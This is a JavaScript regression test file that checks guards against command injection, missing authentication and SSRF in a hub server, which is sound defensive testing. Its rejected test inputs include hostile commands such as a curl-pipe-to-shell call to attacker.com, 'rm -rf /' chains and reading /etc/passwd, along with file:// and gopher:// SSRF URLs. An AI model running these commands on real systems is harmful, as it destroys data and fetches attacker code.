/**
 * Regression tests for the three security findings fixed in hub/server.js:
 *   1. Command injection via spawn with shell:true
 *   2. Missing authentication on all API endpoints
 *   3. SSRF via unvalidated provider base URLs
 *
 * These tests exercise the guard logic extracted from server.js directly so
 * they run without starting a network listener.
 */

import { test } from 'node:test'
import assert from 'node:assert/strict'

// ---- Replicate the guard constants from server.js -------------------------
// These mirror the constants defined at the top of hub/server.js so we can
// test them in isolation without importing the full server module (which would
// start a listener and require config files).

const SAFE_COMMAND_RE = /^[A-Za-z0-9_.\-][A-Za-z0-9_./ \-]*$/
const SHELL_META_RE = /[;&|`$<>!(){}[\]\\'"*?~\n\r]/
const FLAG_INJECT_RE = /(^|\s)-/

function isCommandSafe(cmd) {
  if (!cmd || !cmd.trim()) return false
  if (SHELL_META_RE.test(cmd)) return false
  if (!SAFE_COMMAND_RE.test(cmd)) return false
  const argv = cmd.split(/\s+/).filter(Boolean)
  if (FLAG_INJECT_RE.test(argv[0])) return false
  return true
}

const ALLOWED_URL_SCHEMES = new Set(['http:', 'https:'])

function normalizeProviderUrl(baseUrl) {
  const trimmed = (baseUrl == null ? '' : String(baseUrl)).trim()
  if (!trimmed) return ''
  let parsed
  try {
    parsed = new URL(trimmed)
  } catch {
    return ''
  }
  if (!ALLOWED_URL_SCHEMES.has(parsed.protocol)) {
    return ''
  }
  return trimmed.endsWith('/') ? trimmed.replace(/\/$/, '') : trimmed
}

const HUB_TOKEN_FOR_TEST = 'test-secret-token'

function checkApiAuth(authHeader, token) {
  if (!token) return true
  const prefix = 'Bearer '
  if (!authHeader || !authHeader.startsWith(prefix)) return false
  const supplied = authHeader.slice(prefix.length)
  if (supplied.length !== token.length) return false
  let diff = 0
  for (let i = 0; i < supplied.length; i++) {
    diff |= supplied.charCodeAt(i) ^ token.charCodeAt(i)
  }
  return diff === 0
}

// ---- Finding 1: Command injection -----------------------------------------

test('safe command: binary with flag arg is accepted (flag in arg, not exec)', () => {
  // A hyphen in an argument (not the executable itself) is allowed by the guard.
  // The server splits on whitespace and only checks argv[0] for leading hyphens.
  assert.equal(isCommandSafe('node --version'), true)
})

test('safe command: simple binary with no flags is accepted', () => {
  assert.equal(isCommandSafe('node'), true)
})

test('safe command: binary with safe path arg is accepted', () => {
  assert.equal(isCommandSafe('npm run build'), true)
})

test('command injection: pipe is rejected', () => {
  assert.equal(isCommandSafe('curl http://attacker.com/sh.sh | sh'), false)
})

test('command injection: semicolon chain is rejected', () => {
  assert.equal(isCommandSafe('ls; rm -rf /'), false)
})

test('command injection: backtick substitution is rejected', () => {
  assert.equal(isCommandSafe('echo `id`'), false)
})

test('command injection: dollar substitution is rejected', () => {
  assert.equal(isCommandSafe('echo $(id)'), false)
})

test('command injection: redirect is rejected', () => {
  assert.equal(isCommandSafe('cat /etc/passwd > /tmp/out'), false)
})

test('command injection: ampersand is rejected', () => {
  assert.equal(isCommandSafe('sleep 10 & curl x.com'), false)
})

test('command injection: newline bypass is rejected', () => {
  assert.equal(isCommandSafe('echo ok\nrm -rf /'), false)
})

test('flag injection: leading hyphen on executable is rejected', () => {
  // argv[0] starting with - would be interpreted as a flag by spawn
  assert.equal(isCommandSafe('-al'), false)
})

test('flag injection: executable starting with double hyphen is rejected', () => {
  assert.equal(isCommandSafe('--help'), false)
})

// ---- Finding 2: Authentication --------------------------------------------

test('auth: correct Bearer token is accepted', () => {
  assert.equal(checkApiAuth(`Bearer ${HUB_TOKEN_FOR_TEST}`, HUB_TOKEN_FOR_TEST), true)
})

test('auth: missing Authorization header is rejected', () => {
  assert.equal(checkApiAuth(undefined, HUB_TOKEN_FOR_TEST), false)
})

test('auth: empty string header is rejected', () => {
  assert.equal(checkApiAuth('', HUB_TOKEN_FOR_TEST), false)
})

test('auth: wrong token is rejected', () => {
  assert.equal(checkApiAuth('Bearer wrong-token', HUB_TOKEN_FOR_TEST), false)
})

test('auth: Basic scheme is rejected', () => {
  assert.equal(checkApiAuth(`Basic ${HUB_TOKEN_FOR_TEST}`, HUB_TOKEN_FOR_TEST), false)
})

test('auth: no token configured allows any request', () => {
  // When AAHP_HUB_TOKEN is empty string the guard is bypassed (workstation mode)
  assert.equal(checkApiAuth(undefined, ''), true)
  assert.equal(checkApiAuth('', ''), true)
  assert.equal(checkApiAuth('Bearer anything', ''), true)
})

// ---- Finding 3: SSRF via provider base URL --------------------------------

test('ssrf: http URL is accepted', () => {
  assert.equal(normalizeProviderUrl('http://127.0.0.1:31337'), 'http://127.0.0.1:31337')
})

test('ssrf: https URL is accepted', () => {
  assert.equal(normalizeProviderUrl('https://example.com'), 'https://example.com')
})

test('ssrf: trailing slash is stripped', () => {
  assert.equal(normalizeProviderUrl('http://127.0.0.1:3334/'), 'http://127.0.0.1:3334')
})

test('ssrf: file:// scheme is rejected', () => {
  assert.equal(normalizeProviderUrl('file:///etc/passwd'), '')
})

test('ssrf: gopher:// scheme is rejected', () => {
  assert.equal(normalizeProviderUrl('gopher://attacker.com/'), '')
})

test('ssrf: data: URI is rejected', () => {
  assert.equal(normalizeProviderUrl('data:text/html,<h1>xss</h1>'), '')
})

test('ssrf: ftp:// scheme is rejected', () => {
  assert.equal(normalizeProviderUrl('ftp://attacker.com/'), '')
})

test('ssrf: empty string returns empty string', () => {
  assert.equal(normalizeProviderUrl(''), '')
})

test('ssrf: invalid URL returns empty string', () => {
  assert.equal(normalizeProviderUrl('not-a-url'), '')
})

test('ssrf: null returns empty string', () => {
  assert.equal(normalizeProviderUrl(null), '')
})
